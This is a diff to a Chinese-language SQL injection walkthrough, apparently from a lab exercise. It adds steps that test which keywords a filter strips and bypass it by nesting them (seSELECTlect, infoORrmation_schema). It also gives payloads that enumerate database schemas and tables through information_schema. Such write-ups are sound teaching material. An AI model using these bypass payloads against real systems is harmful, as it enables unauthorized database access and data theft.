@@ -200,27 +200,39 @@ bronze
 
 说明判断正确，且确认存在 SQL Injection。
 
+(但注意：即使不成功也可能是存在sql过滤的原因，不能用来否定查询语句推断错误)
+
 九、数据库枚举
 枚举数据库
 gold=1,country=(select group_concat(schema_name) from information_schema.schemata)
 
-但关键字被过滤。
+测试发现失败，所以因存在过滤器
+
+下一步是测试过滤器过滤什么
+
+gold=1,country="SELECT OR AND group_concat FROM WHERE '"
+
+![SQL注入成功](images/image13.png)
+
+所以SELECT 、 OR 和 AND字符串被过滤
 
 尝试绕过：
 
-seSELECTlect
-infoORrmation_schema
+gold=1,country="SESELECTLECT"
+
+
+![SQL注入成功](images/image14.png)
+
 
 成功绕过过滤。
 
 获取数据库：
+gold=1,country=(seSELECTlect group_concat(schema_name) from infoORrmation_schema.schemata)
 
 bac_test
 
-📷 截图位置
+![数据库枚举](images/image15.png)
 
-images/database_enum.png
-![数据库枚举](images/database_enum.png)
 枚举表
 gold=1,country=(seSELECTlect group_concat(table_name) from infoORrmation_schema.tables WHERE table_schema='bac_test')
 
